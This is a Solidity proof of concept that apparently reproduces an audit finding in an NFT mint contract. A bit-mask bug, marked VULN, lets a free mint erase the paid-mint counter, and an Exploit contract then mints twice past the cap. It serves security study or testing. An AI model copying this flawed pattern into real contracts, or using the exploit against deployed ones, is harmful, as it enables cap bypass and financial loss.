// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Onchain Heroes HeroERC721A — OG free mint wipes the paid-mint counter
    (Pashov, OnchainHeroes 2025-01-13, C-02). SYNTHETIC, cheatcode-free.
    The blamed aux mask is preserved verbatim (@> VULN).

    Aux layout (uint64), as specified in the report:
      [0-2]   other mint flags
      [3-23]  OG free-mint field
      [24-63] OG paid-mint count
    2 guaranteed mints per RING. 5 RINGs => cap 10.
    `_ogMint` keeps only `(_getAux >> 3) & 0x0fffff` and writes that back,
    so bits 24-63 (the paid count) are deleted. The holder then pays the
    guaranteed batch a second time. */

contract HeroERC721A {
    address public immutable holder;
    uint64 public immutable rings;
    uint64 public immutable cap;

    mapping(address => uint256) public balanceOf;
    mapping(address => uint64) private _aux;
    uint256 public paidMinted;
    uint256 public totalSupply;

    error NotEligible();
    error AlreadyMinted();
    error CapReached();

    constructor(address _holder, uint64 _rings) {
        holder = _holder;
        rings = _rings;
        cap = _rings * 2;
    }

    function auxOf(address who) external view returns (uint64) {
        return _aux[who];
    }

    function ogMint(address to, bool freeMint, uint64 paidMintQty, uint64 numOfRings) external {
        if (to != holder) revert NotEligible();
        if (numOfRings != rings) revert NotEligible();
        if (freeMint) {
            _ogMint(to, numOfRings);
        } else {
            _ogPaidMint(to, paidMintQty, numOfRings);
        }
    }

    function _ogPaidMint(address to, uint64 paidMintQty, uint64 numOfRings) internal {
        uint64 already = _getAux(to) >> 24;
        uint64 next = already + paidMintQty;
        if (next > numOfRings * 2) revert CapReached();
        uint64 low = _getAux(to) & uint64((uint256(1) << 24) - 1);
        _setAux(to, low | (next << 24));
        _safeMint(to, paidMintQty);
        paidMinted = paidMinted + paidMintQty;
    }

    function _ogMint(address to, uint64 numOfRings) internal {
        // @> VULN: mask keeps only the free-mint field, so the write below deletes paid mints in bits 24-63.
        uint64 aux = (_getAux(to) >> 3) & 0x0fffff;
        if (aux == numOfRings) revert AlreadyMinted();
        _setAux(to, uint64(aux | (numOfRings << 3)));
        _safeMint(to, numOfRings);
    }

    function _getAux(address who) internal view returns (uint64) {
        return _aux[who];
    }

    function _setAux(address who, uint64 value) internal {
        _aux[who] = value;
    }

    function _safeMint(address to, uint256 qty) internal {
        balanceOf[to] = balanceOf[to] + qty;
        totalSupply = totalSupply + qty;
    }
}

contract Exploit {
    uint64 public constant RINGS = 5;
    uint64 public constant CAP = 10;

    HeroERC721A public hero; // CREATE nonce 1
    uint256 public afterFirst;
    uint64 public auxAfterFree;
    uint256 public paid;
    uint256 public minted;

    constructor() {
        hero = new HeroERC721A(address(this), RINGS);
    }

    function run() external {
        hero.ogMint(address(this), false, CAP, RINGS);
        afterFirst = hero.balanceOf(address(this));
        hero.ogMint(address(this), true, 0, RINGS);
        auxAfterFree = hero.auxOf(address(this));
        hero.ogMint(address(this), false, CAP, RINGS);
        paid = hero.paidMinted();
        minted = hero.balanceOf(address(this));
        require(hero.cap() == CAP, "cap is 10");
        require(afterFirst == CAP, "first batch stopped at the cap");
        require(auxAfterFree >> 24 == 0, "paid counter not wiped");
        require(paid == CAP * 2, "paid mints are not 2x the cap");
        require(minted == 25, "10 paid + 5 free + 10 paid");
    }
}
